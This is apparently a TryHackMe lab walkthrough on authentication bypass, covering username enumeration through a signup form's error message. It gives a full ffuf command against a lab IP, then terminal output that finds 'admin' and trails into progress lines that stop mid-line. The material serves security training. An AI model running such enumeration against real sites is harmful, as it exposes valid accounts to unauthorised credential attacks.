---
Learn how to defeat logins and other authentication mechanisms to allow you access to unpermitted areas.
---

In this room, we will learn about different ways website authentication methods can be bypassed, defeated or broken. These vulnerabilities can be some of the most critical as it often ends in leaks of customers personal data.

Start the machine and then proceed to the next task.

### Username Enumeration 

A helpful exercise to complete when trying to find authentication vulnerabilities is creating a list of valid usernames, which we'll use later in other tasks.


Website error messages are great resources for collating this information to build our list of valid usernames. We have a form to create a new user account if we go to the Acme IT Support website (http://10.10.235.218/customers/signup) signup page.


If you try entering the username admin and fill in the other form fields with fake information, you'll see we get the error An account with this username already exists. We can use the existence of this error message to produce a list of valid usernames already signed up on the system by using the ffuf tool below. The ffuf tool uses a list of commonly used usernames to check against for any matches.


Username enumeration with ffuf

           
user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.235.218/customers/signup -mr "username already exists"

        

In the above example, the -w argument selects the file's location on the computer that contains the list of usernames that we're going to check exists. The -X argument specifies the request method, this will be a GET request by default, but it is a POST request in our example. The -d argument specifies the data that we are going to send. In our example, we have the fields username, email, password and cpassword. We've set the value of the username to FUZZ. In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request. The -H argument is used for adding additional headers to the request. In this instance, we're setting the Content-Type to the webserver knows we are sending form data. The -u argument specifies the URL we are making the request to, and finally, the -mr argument is the text on the page we are looking for to validate we've found a valid username.

The ffuf tool and wordlist come pre-installed on the AttackBox or can be installed locally by downloading it from https://github.com/ffuf/ffuf.

Create a file called valid_usernames.txt and add the usernames that you found using ffuf; these will be used in Task 3.

```
┌──(kali㉿kali)-[/usr/share/seclists/Usernames/Names]
└─$ ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.235.218/customers/signup -mr "username already exists"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.235.218/customers/signup
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/Names/names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&email=x&password=x&cpassword=x
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: username already exists
________________________________________________

admin                   [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 216ms]
:: Progress: [1001/10177] :: Job [1/1] :: 176 req/sec :: Duration: [0:00:05] :: Errors: 0 ::: Progress: [1005/10177] :: Job [1/1] :: 176 req/sec :: Duration: [0:00:05] :: Errors: 0 ::: Progress: [1041/10177] :: Job [1/1] :: 176 req/sec :: Duration: [0:00:05] :: Errors: 0 ::: Progress: [1053/10177] :: Job [1/1] :: 177 req/sec :: Duration: [0:00:06] :: Errors: 0 ::: Progress: [1083/10177] :: Job [1/1] :: 183 req/sec :: Duration: [0:00:06] :: Errors: 0 ::: Progress: [1096/10177] :: Job [1/1] :: 183 req/sec :: Duration: [0:00:06] :: Errors: 0 ::: Progress: [1125/10177] :: Job [1/1] :: 182 req/sec :: Duration: [0:00:06] :: Errors: 0 ::: Progress: [1161/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:06] :: Errors: 0 ::: Progress: [1167/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:06] :: Errors: 0 ::: Progress: [1202/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:06] :: Errors: 0 ::: Progress: [1215/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:07] :: Errors: 0 ::: Progress: [1242/10177] :: Job [1/1] :: 180 req/sec :: Duration: [0:00:07] :: Errors: 0 ::: Progress: [1260/10177] :: Job [1/1] :: 182 req/sec :: Duration: [0:00:07] :: Errors: 0 ::: Progress: [1287/10177] :: Job [1/1] :: 182 req/sec :: Duration: [0:00:07] :: Errors: 0 ::: Progress: [1318/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:07] :: Errors: 0 ::: Progress: [1334/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:07] :: Errors: 0 ::: Progress: [1362/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:07] :: Errors: 0 ::: Progress: [1375/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:07] :: Errors: 0 ::: Progress: [1407/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:08] :: Errors: 0 ::: Progress: [1429/10177] :: Job [1/1] :: 183 req/sec :: Duration: [0:00:08] :: Errors: 0 ::: Progress: [1449/10177] :: Job [1/1] :: 181 req/sec :: Duration: [0:00:08] :: Errors: 0 ::: Progress: [1482/10177] :: Job [1/1] :: 181 req/sec :: Duration: [0:00:08] :: Errors: 0 ::: Progress: [1495/10177] :: Job [1/1] :: 182 req/sec :: Duration: [0:00:08] :: Errors: 0 ::: Progress: [1522/10177] :: Job [1/1] :: 163 req/sec :: Duration: [0:00:08] :: Errors: 0 ::: Progress: [1537/10177] :: Job [1/1] :: 163 req/sec :: Duration: [0:00:08] :: Errors: 0 ::: Progress: [1571/10177] :: Job [1/1] :: 163 req/sec :: Duration: [0:00:08] :: Errors: 0 ::: Progress: [1581/10177] :: Job [1/1] :: 163 req/sec :: Duration: [0:00:09] :: Errors: 0 ::: Progress: [1615/10177] :: Job [1/1] :: 159 req/sec :: Duration: [0:00:09] :: Errors: 0 ::: Progress: [1624/10177] :: Job [1/1] :: 160 req/sec :: Duration: [0:00:09] :: Errors: 0 ::: Progress: [1655/10177] :: Job [1/1] :: 160 req/sec :: Duration: [0:00:09] :: Errors: 0 ::: Progress: [1664/10177] :: Job [1/1] :: 160 req/sec :: Duration: [0:00:09] :: Errors: 0 ::: Progress: [1697/10177] :: Job [1/1] :: 177 req/sec :: Duration: [0:00:09] :: Errors: 0 ::: Progress: [1705/10177] :: Job [1/1] :: 172 req/sec :: Duration: [0:00:09] :: Errors: 0 ::: Progress: [1737/10177] :: Job [1/1] :: 172 req/sec :: Duration: [0:00:09] :: Errors: 0 ::: Progress: [1758/10177] :: Job [1/1] :: 175 req/sec :: Duration: [0:00:10] :: Errors: 0 ::: Progress: [1784/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:10] :: Errors: 0 ::: Progress: [1817/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:10] :: Errors: 0 ::: Progress: [1825/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:10] :: Errors: 0 ::: Progress: [1857/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:10] :: Errors: 0 ::: Progress: [1869/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:10] :: Errors: 0 ::: Progress: [1904/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:10] :: Errors: 0 ::: Progress: [1937/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:10] :: Errors: 0 ::: Progress: [1945/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:11] :: Errors: 0 ::: Progress: [1977/10177] :: Job [1/1] :: 174 req/sec :: Duration: [0:00:11] :: Errors: 0 ::: Progress: [1989/10177] :: Job [1/1] :: 174 req/sec :: Duration: [0:00:11] :: Errors: 0 ::: Progress: [2020/10177] :: Job [1/1] :: 174 req/sec :: Duration: [0:00:11] :: Errors: 0 ::: Progress: [2030/10177] :: Job [1/1] :: 174 req/sec :: Duration: [0:00:11] :: Errors: 0 ::: Progress: [2064/10177] :: Job [1/1] :: 177 req/sec :: Duration: [0:00:11] :: Errors: 0 ::: Progress: [2071/10177] :: Job [1/1] :: 176 req/sec :: Duration: [0:00:11] :: Errors: 0 ::: Progress: [2105/10177] :: Job [1/1] :: 176 req/sec :: Duration: [0:00:11] :: Errors: 0 ::: Progress: [2117/10177] :: Job [1/1] :: 177 req/sec :: Duration: [0:00:12] :: Errors: 0 ::: Progress: [2129/10177] :: Job [1/1] :: 169 req/sec :: Duration: [0:00:12] :: Errors: 0 ::: Progress: [2157/10177] :: Job [1/1] :: 140 req/sec :: Duration: [0:00:12] :: Errors: 0 ::: Progress: [2160/10177] :: Job [1/1] :: 140 req/sec :: Duration: [0:00:12] :: Errors: 0 ::: Progress: [2200/10177] :: Job [1/1] :: 140 req/sec :: Duration: [0:00:12] :: Errors: 0 ::: Progress: [2200/10177] :: Job [1/1] :: 140 req/sec :: Duration: [0:00:12] :: Errors: 0 ::: Progress: [2240/10177] :: Job [1/1] :: 164 req/sec :: Duration: [0:00:12] :: Errors: 0 ::: Progress: [2241/10177] :: Job [1/1] :: 164 req/sec :: Duration: [0:00:12] :: Errors: 0 ::: Progress: [2280/10177] :: Job [1/1] :: 164 req/sec :: Duration: [0:00:13] :: Errors: 0 ::: Progress: [2282/10177] :: Job [1/1] :: 164 req/sec :: Duration: [0:00:13] :: Errors: 0 ::: Progress: [2320/10177] :: Job [1/1] :: 154 req/sec :: Duration: [0:00:13] :: Errors: 0 ::: Progress: [2322/10177] :: Job [1/1] :: 154 req/sec :: Duration: [0:00:13] :: Errors: 0 ::: Progress: [2360/10177] :: Job [1/1] :: 154 req/sec :: Duration: [0:00:13] :: Errors: 0 ::: Progress: [2366/10177] :: Job [1/1] :: 155 req/sec :: Duration: [0:00:13] :: Errors: 0 ::: Progress: [2401/10177] :: Job [1/1] :: 174 req/sec :: Duration: [0:00:13] :: Errors: 0 ::: Progress: [2415/10177] :: Job [1/1] :: 174 req/sec :: Duration: [0:00:14] :: Errors: 0 ::: Progress: [2441/10177] :: Job [1/1] :: 174 req/sec :: Duration: [0:00:14] :: Errors: 0 ::: Progress: [2480/10177] :: Job [1/1] :: 164 req/sec :: Duration: [0:00:14] :: Errors: 0 ::: Progress: [2481/10177] :: Job [1/1] :: 163 req/sec :: Duration: [0:00:14] :: Errors: 0 ::: Progress: [2520/10177] :: Job [1/1] :: 163 req/sec :: Duration: [0:00:14] :: Errors: 0 ::: Progress: [2521/10177] :: Job [1/1] :: 163 req/sec :: Duration: [0:00:14] :: Errors: 0 ::: Progress: [2521/10177] :: Job [1/1] :: 163 req/sec :: Duration: [0:00:14] :: Errors: 0 ::: Progress: [2521/10177] :: Job [1/1] :: 163 req/sec :: Duration: [0:00:14] :: Errors: 0 ::: Progress: [2528/10177] :: Job [1/1] :: 133 req/sec :: Duration: [0:00:15] :: Errors: 0 ::: Progress: [2641/10177] :: Job [1/1] :: 169 req/sec :: Duration: [0:00:15] :: Errors: 0 ::: Progress: [2648/10177] :: Job [1/1] :: 169 req/sec :: Duration: [0:00:15] :: Errors: 0 ::: Progress: [2648/10177] :: Job [1/1] :: 169 req/sec :: Duration: [0:00:16] :: Errors: 0 ::: Progress: [2648/10177] :: Job [1/1] :: 169 req/sec :: Duration: [0:00:16] :: Errors: 0 ::: Progress: [2648/10177] :: Job [1/1] :: 169 req/sec :: Duration: [0:00:16] :: Errors: 0 ::: Progress: [2648/10177] :: Job [1/1] :: 169 req/sec :: Duration: [0:00:16] :: Errors: 0 ::: Progress: [2654/10177] :: Job [1/1] :: 169 req/sec :: Duration: [0:00:16] :: Errors: 0 ::: Progress: [2667/10177] :: Job [1/1] :: 119 req/sec :: Duration: [0:00:16] :: Errors: 0 ::: Progress: [2683/10177] :: Job [1/1] :: 119 req/sec :: Duration: [0:00:16] :: Errors: 0 ::: Progress: [2707/10177] :: Job [1/1] :: 120 req/sec :: Duration: [0:00:16] :: Errors: 0 ::: Progress: [2734/10177] :: Job [1/1] :: 165 req/sec :: Duration: [0:00:17] :: Errors: 0 ::: Progress: [2747/10177] :: Job [1/1] :: 165 req/sec :: Duration: [0:00:17] :: Errors: 0 ::: Progress: [2781/10177] :: Job [1/1] :: 166 req/sec :: Duration: [0:00:17] :: Errors: 0 ::: Progress: [2787/10177] :: Job [1/1] :: 167 req/sec :: Duration: [0:00:17] :: Errors: 0 ::: Progress: [2827/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:17] :: Errors: 0 ::: Progress: [2828/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:17] :: Errors: 0 ::: Progress: [2867/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:17] :: Errors: 0 ::: Progress: [2877/10177] :: Job [1/1] :: 182 req/sec :: Duration: [0:00:17] :: Errors: 0 ::: Progress: [2907/10177] :: Job [1/1] :: 180 req/sec :: Duration: [0:00:18] :: Errors: 0 ::: Progress: [2947/10177] :: Job [1/1] :: 180 req/sec :: Duration: [0:00:18] :: Errors: 0 ::: Progress: [2947/10177] :: Job [1/1] :: 180 req/sec :: Duration: [0:00:18] :: Errors: 0 ::: Progress: [2980/10177] :: Job [1/1] :: 157 req/sec :: Duration: [0:00:18] :: Errors: 0 ::: Progress: [2981/10177] :: Job [1/1] :: 157 req/sec :: Duration: [0:00:18] :: Errors: 0 ::: Progress: [3013/10177] :: Job [1/1] :: 173 req/sec :: Duration: [0:00:18] :: Errors: 0 ::: Progress: [3022/10177] :: Job [1/1] :: 173 req/sec :: Duration: [0:00:18] :: Errors: 0 ::: Progress: [3049/10177] :: Job [1/1] :: 173 req/sec :: Duration: [0:00:18] :: Errors: 0 ::: Progress: [3065/10177] :: Job [1/1] :: 178 req/sec :: Duration: [0:00:19] :: Errors: 0 ::: Progress: [3089/10177] :: Job [1/1] :: 163 req/sec :: Duration: [0:00:19] :: Errors: 0 ::: Progress: [3112/10177] :: Job [1/1] :: 160 req/sec :: Duration: [0:00:19] :: Errors: 0 ::: Progress: [3129/10177] :: Job [1/1] :: 160 req/sec :: Duration: [0:00:19] :: Errors: 0 ::: Progress: [3152/10177] :: Job [1/1] :: 160 req/sec :: Duration: [0:00:19] :: Errors: 0 ::: Progress: [3169/10177] :: Job [1/1] :: 174 req/sec :: Duration: [0:00:19] :: Errors: 0 ::: Progress: [3199/10177] :: Job [1/1] :: 181 req/sec :: Duration: [0:00:19] :: Errors: 0 ::: Progress: [3210/10177] :: Job [1/1] :: 181 req/sec :: Duration: [0:00:19] :: Errors: 0 ::: Progress: [3249/10177] :: Job [1/1] :: 183 req/sec :: Duration: [0:00:20] :: Errors: 0 ::: Progress: [3272/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:20] :: Errors: 0 ::: Progress: [3289/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:20] :: Errors: 0 ::: Progress: [3315/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:20] :: Errors: 0 ::: Progress: [3330/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:20] :: Errors: 0 ::: Progress: [3352/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:20] :: Errors: 0 ::: Progress: [3377/10177] :: Job [1/1] :: 174 req/sec :: Duration: [0:00:20] :: Errors: 0 ::: Progress: [3395/10177] :: Job [1/1] :: 174 req/sec :: Duration: [0:00:20] :: Errors: 0 ::: Progress: [3418/10177] :: Job [1/1] :: 174 req/sec :: Duration: [0:00:21] :: Errors: 0 ::: Progress: [3435/10177] :: Job [1/1] :: 176 req/sec :: Duration: [0:00:21] :: Errors: 0 ::: Progress: [3464/10177] :: Job [1/1] :: 181 req/sec :: Duration: [0:00:21] :: Errors: 0 ::: Progress: [3479/10177] :: Job [1/1] :: 181 req/sec :: Duration: [0:00:21] :: Errors: 0 ::: Progress: [3506/10177] :: Job [1/1] :: 182 req/sec :: Duration: [0:00:21] :: Errors: 0 ::: Progress: [3537/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:21] :: Errors: 0 ::: Progress: [3555/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:21] :: Errors: 0 ::: Progress: [3579/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:22] :: Errors: 0 ::: Progress: [3598/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:22] :: Errors: 0 ::: Progress: [3626/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:22] :: Errors: 0 ::: Progress: [3645/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:22] :: Errors: 0 ::: Progress: [3675/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:22] :: Errors: 0 ::: Progress: [3698/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:22] :: Errors: 0 ::: Progress: [3717/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:22] :: Errors: 0 ::: Progress: [3738/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:22] :: Errors: 0 ::: Progress: [3761/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:23] :: Errors: 0 ::: Progress: [3779/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:23] :: Errors: 0 ::: Progress: [3805/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:23] :: Errors: 0 ::: Progress: [3837/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:23] :: Errors: 0 ::: Progress: [3845/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:23] :: Errors: 0 ::: Progress: [3879/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:23] :: Errors: 0 ::: Progress: [3889/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:23] :: Errors: 0 ::: Progress: [3925/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:23] :: Errors: 0 ::: Progress: [3949/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:24] :: Errors: 0 ::: Progress: [3962/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:24] :: Errors: 0 ::: Progress: [3983/10177] :: Job [1/1] :: 182 req/sec :: Duration: [0:00:24] :: Errors: 0 ::: Progress: [4002/10177] :: Job [1/1] :: 167 req/sec :: Duration: [0:00:24] :: Errors: 0 ::: Progress: [4023/10177] :: Job [1/1] :: 167 req/sec :: Duration: [0:00:24] :: Errors: 0 ::: Progress: [4049/10177] :: Job [1/1] :: 167 req/sec :: Duration: [0:00:24] :: Errors: 0 ::: Progress: [4082/10177] :: Job [1/1] :: 182 req/sec :: Duration: [0:00:24] :: Errors: 0 ::: Progress: [4103/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:24] :: Errors: 0 ::: Progress: [4122/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:25] :: Errors: 0 ::: Progress: [4143/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:25] :: Errors: 0 ::: Progress: [4162/10177] :: Job [1/1] :: 175 req/sec :: Duration: [0:00:25] :: Errors: 0 ::: Progress: [4186/10177] :: Job [1/1] :: 173 req/sec :: Duration: [0:00:25] :: Errors: 0 ::: Progress: [4223/10177] :: Job [1/1] :: 173 req/sec :: Duration: [0:00:25] :: Errors: 0 ::: Progress: [4231/10177] :: Job [1/1] :: 175 req/sec :: Duration: [0:00:25] :: Errors: 0 ::: Progress: [4263/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:25] :: Errors: 0 ::: Progress: [4282/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:25] :: Errors: 0 ::: Progress: [4306/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:26] :: Errors: 0 ::: Progress: [4343/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:26] :: Errors: 0 ::: Progress: [4346/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:26] :: Errors: 0 ::: Progress: [4383/10177] :: Job [1/1] :: 181 req/sec :: Duration: [0:00:26] :: Errors: 0 ::: Progress: [4402/10177] :: Job [1/1] :: 181 req/sec :: Duration: [0:00:26] :: Errors: 0 ::: Progress: [4426/10177] :: Job [1/1] :: 181 req/sec :: Duration: [0:00:26] :: Errors: 0 ::: Progress: [4445/10177] :: Job [1/1] :: 183 req/sec :: Duration: [0:00:26] :: Errors: 0 ::: Progress: [4466/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:26] :: Errors: 0 ::: Progress: [4503/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:27] :: Errors: 0 ::: Progress: [4519/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:27] :: Errors: 0 ::: Progress: [4544/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:27] :: Errors: 0 ::: Progress: [4564/10177] :: Job [1/1] :: 179 req/sec :: Duration: [0:00:27] :: Errors: 0 ::: Progress: [4584/10177] :: Job [1/1] :: 179 req/sec :: Duration: [0:00:27] :: Errors: 0 ::: Progress: [4621/10177] :: Job [1/1] :: 179 req/sec :: Duration: [0:00:27] :: Errors: 0 ::: Progress: [4633/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:27] :: Errors: 0 ::: Progress: [4664/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:27] :: Errors: 0 ::: Progress: [4684/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:28] :: Errors: 0 ::: Progress: [4704/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:28] :: Errors: 0 ::: Progress: [4739/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:28] :: Errors: 0 ::: Progress: [4752/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:28] :: Errors: 0 ::: Progress: [4784/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:28] :: Errors: 0 ::: Progress: [4787/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:28] :: Errors: 0 ::: Progress: [4824/10177] :: Job [1/1] :: 183 req/sec :: Duration: [0:00:28] :: Errors: 0 ::: Progress: [4851/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:28] :: Errors: 0 ::: Progress: [4864/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:29] :: Errors: 0 ::: Progress: [4904/10177] :: Job [1/1] :: 181 req/sec :: Duration: [0:00:29] :: Errors: 0 ::: Progress: [4907/10177] :: Job [1/1] :: 181 req/sec :: Duration: [0:00:29] :: Errors: 0 ::: Progress: [4944/10177] :: Job [1/1] :: 173 req/sec :: Duration: [0:00:29] :: Errors: 0 ::: Progress: [4958/10177] :: Job [1/1] :: 173 req/sec :: Duration: [0:00:29] :: Errors: 0 ::: Progress: [4984/10177] :: Job [1/1] :: 173 req/sec :: Duration: [0:00:29] :: Errors: 0 ::: Progress: [4998/10177] :: Job [1/1] :: 171 req/sec :: Duration: [0:00:29] :: Errors: 0 ::: Progress: [5024/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:29] :: Errors: 0 ::: Progress: [5048/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:30] :: Errors: 0 ::: Progress: [5064/10177] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:30] :: Errors: 0 ::: Progress: [5104/10177] :: Job [1/1] :: 183 req/sec :: Duration: [0:00:30] :: Errors: 0 ::: Progress: [5118/10177] :: Job [1/1] :: 183 req/sec :: Duration: [0:00:30] :: Errors: 0 ::: Progress: [5144/10177] :: Job [1/1] :: 183 req/sec :: Duration: [0:00:30] :: Errors: 0 ::: Progress: [5158/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:30] :: Errors: 0 ::: Progress: [5180/10177] :: Job [1/1] :: 182 req/sec :: Duration: [0:00:30] :: Errors: 0 ::: Progress: [5216/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:30] :: Errors: 0 ::: Progress: [5230/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:31] :: Errors: 0 ::: Progress: [5256/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:31] :: Errors: 0 ::: Progress: [5271/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:31] :: Errors: 0 ::: Progress: [5296/10177] :: Job [1/1] :: 189 req/sec :: Duration: [0:00:31] :: Errors: 0 ::: Progress: [5328/10177] :: Job [1/1] :: 189 req/sec :: Duration: [0:00:31] :: Errors: 0 ::: Progress: [5346/10177] :: Job [1/1] :: 189 req/sec :: Duration: [0:00:31] :: Errors: 0 ::: Progress: [5376/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:31] :: Errors: 0 ::: Progress: [5391/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:31] :: Errors: 0 ::: Progress: [5416/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:32] :: Errors: 0 ::: Progress: [5444/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:32] :: Errors: 0 ::: Progress: [5459/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:32] :: Errors: 0 ::: Progress: [5496/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:32] :: Errors: 0 ::: Progress: [5511/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:32] :: Errors: 0 ::: Progress: [5536/10177] :: Job [1/1] :: 189 req/sec :: Duration: [0:00:32] :: Errors: 0 ::: Progress: [5563/10177] :: Job [1/1] :: 190 req/sec :: Duration: [0:00:32] :: Errors: 0 ::: Progress: [5580/10177] :: Job [1/1] :: 190 req/sec :: Duration: [0:00:32] :: Errors: 0 ::: Progress: [5616/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:33] :: Errors: 0 ::: Progress: [5631/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:33] :: Errors: 0 ::: Progress: [5656/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:33] :: Errors: 0 ::: Progress: [5677/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:33] :: Errors: 0 ::: Progress: [5699/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:33] :: Errors: 0 ::: Progress: [5736/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:33] :: Errors: 0 ::: Progress: [5751/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:33] :: Errors: 0 ::: Progress: [5776/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:33] :: Errors: 0 ::: Progress: [5797/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:34] :: Errors: 0 ::: Progress: [5816/10177] :: Job [1/1] :: 167 req/sec :: Duration: [0:00:34] :: Errors: 0 ::: Progress: [5837/10177] :: Job [1/1] :: 167 req/sec :: Duration: [0:00:34] :: Errors: 0 ::: Progress: [5856/10177] :: Job [1/1] :: 167 req/sec :: Duration: [0:00:34] :: Errors: 0 ::: Progress: [5887/10177] :: Job [1/1] :: 177 req/sec :: Duration: [0:00:34] :: Errors: 0 ::: Progress: [5907/10177] :: Job [1/1] :: 182 req/sec :: Duration: [0:00:34] :: Errors: 0 ::: Progress: [5926/10177] :: Job [1/1] :: 182 req/sec :: Duration: [0:00:34] :: Errors: 0 ::: Progress: [5937/10177] :: Job [1/1] :: 182 req/sec :: Duration: [0:00:35] :: Errors: 0 ::: Progress: [5956/10177] :: Job [1/1] :: 182 req/sec :: Duration: [0:00:35] :: Errors: 0 ::: Progress: [5978/10177] :: Job [1/1] :: 184 req/sec :: Duration: [0:00:35] :: Errors: 0 ::: Progress: [6006/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:35] :: Errors: 0 ::: Progress: [6036/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:35] :: Errors: 0 ::: Progress: [6057/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:35] :: Errors: 0 ::: Progress: [6076/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:35] :: Errors: 0 ::: Progress: [6099/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:35] :: Errors: 0 ::: Progress: [6123/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:36] :: Errors: 0 ::: Progress: [6156/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:36] :: Errors: 0 ::: Progress: [6177/10177] :: Job [1/1] :: 189 req/sec :: Duration: [0:00:36] :: Errors: 0 ::: Progress: [6196/10177] :: Job [1/1] :: 189 req/sec :: Duration: [0:00:36] :: Errors: 0 ::: Progress: [6219/10177] :: Job [1/1] :: 189 req/sec :: Duration: [0:00:36] :: Errors: 0 ::: Progress: [6236/10177] :: Job [1/1] :: 189 req/sec :: Duration: [0:00:36] :: Errors: 0 ::: Progress: [6273/10177] :: Job [1/1] :: 170 req/sec :: Duration: [0:00:36] :: Errors: 0 ::: Progress: [6273/10177] :: Job [1/1] :: 170 req/sec :: Duration: [0:00:36] :: Errors: 0 ::: Progress: [6310/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:37] :: Errors: 0 ::: Progress: [6334/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:37] :: Errors: 0 ::: Progress: [6350/10177] :: Job [1/1] :: 186 req/sec :: Duration: [0:00:37] :: Errors: 0 ::: Progress: [6388/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:37] :: Errors: 0 ::: Progress: [6393/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:37] :: Errors: 0 ::: Progress: [6430/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:37] :: Errors: 0 ::: Progress: [6451/10177] :: Job [1/1] :: 189 req/sec :: Duration: [0:00:37] :: Errors: 0 ::: Progress: [6470/10177] :: Job [1/1] :: 187 req/sec :: Duration: [0:00:37] :: Errors: 0 ::: Progress: [6503/10177] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:38] :: Errors: 0 ::: Progress: [6513/10177] :: 